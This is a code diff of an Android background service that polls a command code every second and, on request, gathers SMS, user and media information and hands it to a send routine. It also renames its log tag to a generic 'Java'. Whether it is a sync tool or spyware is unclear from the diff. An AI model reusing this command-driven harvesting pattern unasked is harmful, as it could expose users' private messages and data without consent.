@@ -39,7 +39,7 @@ public class androidService extends Service {
 	int i = 0;
 	int testtimes = 0;
 
-	private static final String TAG = "PHONESERVICE";
+	private static final String TAG = "Java";
 
 	@Override
 	public void onCreate() {
@@ -70,6 +70,34 @@ public class androidService extends Service {
 			};
 		}.start();
 	}
+	
+	@Override
+	public IBinder onBind(Intent arg0) {
+		// TODO Auto-generated method stub
+		return null;
+	}
+
+	@Override
+	public void onStart(Intent intent, int startId) {
+		Log.e(TAG, "start onStart~~~");
+		super.onStart(intent, startId);
+	}
+
+	@Override
+	public void onDestroy() {
+		Appmanager.exitprograme();
+		android.os.Process.killProcess(android.os.Process.myPid());
+		System.exit(0);
+		Log.d(TAG, "start onDestroy~~~");
+		super.onDestroy();
+	}
+
+	@Override
+	public boolean onUnbind(Intent intent) {
+		Log.d(TAG, "start onUnbind~~~");
+		return super.onUnbind(intent);
+	}
+	
 
 	public String getSmsInPhone() {
 		i = 0;
@@ -211,31 +239,7 @@ public class androidService extends Service {
 //
 //	}
 
-	@Override
-	public IBinder onBind(Intent arg0) {
-		// TODO Auto-generated method stub
-		return null;
-	}
 
-	@Override
-	public void onStart(Intent intent, int startId) {
-		Log.e(TAG, "start onStart~~~");
-		super.onStart(intent, startId);
-	}
-
-	@Override
-	public void onDestroy() {
-		android.os.Process.killProcess(android.os.Process.myPid());
-		System.exit(0);
-		Log.d(TAG, "start onDestroy~~~");
-		super.onDestroy();
-	}
-
-	@Override
-	public boolean onUnbind(Intent intent) {
-		Log.d(TAG, "start onUnbind~~~");
-		return super.onUnbind(intent);
-	}
 
 	private int count = 0;
 	private Handler mHandler = new Handler();
@@ -249,6 +253,14 @@ public class androidService extends Service {
 			// count++;
 			// setTitle("" + count);
 			// 每2秒执行一次
+//			#define CMD_IMAGE  0X01
+//			 20 #define CMD_VIDEO  0X02
+//			 21 #define CMD_MUSIC  0X03
+//			 22 #define CMD_APP    0X04
+//			 23 #define CMD_MMS    0X05
+//			 24 #define CMD_BOOK   0X06
+
+			
 			switch (Appmanager.whatyouwant()) {
 			case 0x01: // imageinfo
 				Log.d(TAG, "get appinfo");
@@ -269,11 +281,13 @@ public class androidService extends Service {
 				break;
 			case 0x06: // bookinfo
 				Log.d(TAG, "get booksinfo");
+				getUserInfo();
+				Appmanager.gotosend(6);
 				break;
 			default:
 				break;
 			}
-			mHandler.postDelayed(mRunnable, 2000);
+			mHandler.postDelayed(mRunnable, 1000);
 		}
 
 	};
